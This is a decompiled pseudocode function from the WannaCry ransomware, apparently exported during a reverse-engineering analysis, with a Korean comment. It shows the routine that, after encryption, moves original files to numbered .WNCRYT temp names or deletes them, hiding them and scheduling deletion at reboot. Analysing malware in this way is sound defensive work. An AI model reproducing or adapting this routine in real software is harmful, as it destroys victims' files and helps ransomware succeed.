// --- Metadata ---
// Function Name: WannaCryFilePurger_100029F0
// Address: 0x100029F0
// Exported At: 20250522_122713
// Signature: unknown_signature
// ---------------
void __thiscall __noreturn WannaCryFilePurger_100029F0(int this)
{
  int i; // edi
  const WCHAR *v3; // edi
  DWORD v4; // eax
  DWORD v5; // eax
  _DWORD **v6; // edi
  _DWORD *v7; // ecx
  char v8; // al
  int v9; // eax
  int v10; // [esp-8h] [ebp-18h]

  while ( !*(_DWORD *)(this + 1244) )           // 암호화가 끝난 뒤 원본 파일 삭제/이동, 또는 실패한 파일 삭제 시도 
  {
    for ( i = 0; i < 60; ++i )
    {
      if ( *(_DWORD *)(this + 1244) )
        goto LABEL_23;
      Sleep(0x3E8u);
    }
    if ( *(_DWORD *)(this + 1244) )
      break;
    EnterCriticalSection((LPCRITICAL_SECTION)(this + 1260));
    if ( *(_DWORD *)(this + 1256) )
    {
      do
      {
        v3 = `std::wstring::_Nullstr'::`2'::_C;
        if ( *(_DWORD *)(**(_DWORD **)(this + 1252) + 12) )
          v3 = *(const WCHAR **)(**(_DWORD **)(this + 1252) + 12);
        if ( !wcslen((const wchar_t *)(this + 1804)) )
          goto LABEL_26;
        if ( !MoveFileExW_0(v3, (LPCWSTR)(this + 1804), 1u) && GetFileAttributesW((LPCWSTR)(this + 1804)) != -1 )
        {
          v4 = GetFileAttributesW((LPCWSTR)(this + 1804));
          LOBYTE(v4) = v4 | 2;
          SetFileAttributesW((LPCWSTR)(this + 1804), v4);
          MoveFileExW_0((LPCWSTR)(this + 1804), 0, 4u);
        }
        v10 = *(_DWORD *)(this + 2324);
        *(_DWORD *)(this + 2324) = v10 + 1;
        swprintf(
          (wchar_t *const)(this + 1804),
          (const size_t)L"%s\\%d%s",
          (const wchar_t *const)(this + 1284),
          v10,
          L".WNCRYT");
        if ( !MoveFileExW_0(v3, (LPCWSTR)(this + 1804), 1u) )
        {
LABEL_26:
          if ( !DeleteFileW_0(v3) )
          {
            v5 = GetFileAttributesW(v3);
            LOBYTE(v5) = v5 | 2;
            SetFileAttributesW(v3, v5);
            MoveFileExW_0(v3, 0, 4u);
          }
        }
        v6 = **(_DWORD ****)(this + 1252);
        *v6[1] = *v6;
        (*v6)[1] = v6[1];
        v7 = v6[3];
        if ( v7 )
        {
          v8 = *((_BYTE *)v7 - 1);
          if ( !v8 || v8 == -1 )
            operator delete((char *)v7 - 2);
          else
            *((_BYTE *)v7 - 1) = v8 - 1;
        }
        v6[3] = 0;
        v6[4] = 0;
        v6[5] = 0;
        operator delete(v6);
        v9 = *(_DWORD *)(this + 1256) - 1;
        *(_DWORD *)(this + 1256) = v9;
      }
      while ( v9 );
    }
    LeaveCriticalSection((LPCRITICAL_SECTION)(this + 1260));
  }
LABEL_23:
  ExitThread(0);
}
